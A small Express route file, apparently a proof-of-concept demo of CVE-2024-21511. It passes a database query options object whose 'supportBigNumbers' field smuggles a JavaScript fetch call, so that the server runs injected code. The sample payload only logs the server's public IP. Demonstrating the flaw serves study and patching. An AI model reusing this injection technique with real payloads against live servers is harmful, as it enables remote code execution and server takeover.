import { Router } from "express";
import Database from "../db";

const testRouter = Router();

testRouter.get("/", async (req, res) => {
  // CVE-2024-21511 Demo

  // Disable ts error

  const maliciousPayload = {
    sql: `SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`,
    supportBigNumbers:
      'fetch("https://ip.jsontest.com").then((res) =>res.json().then((json) => console.log(json)))',
  };

  await Database.connection.query(maliciousPayload);

  res.json({ message: "Hello, World!" });
});

export default testRouter;
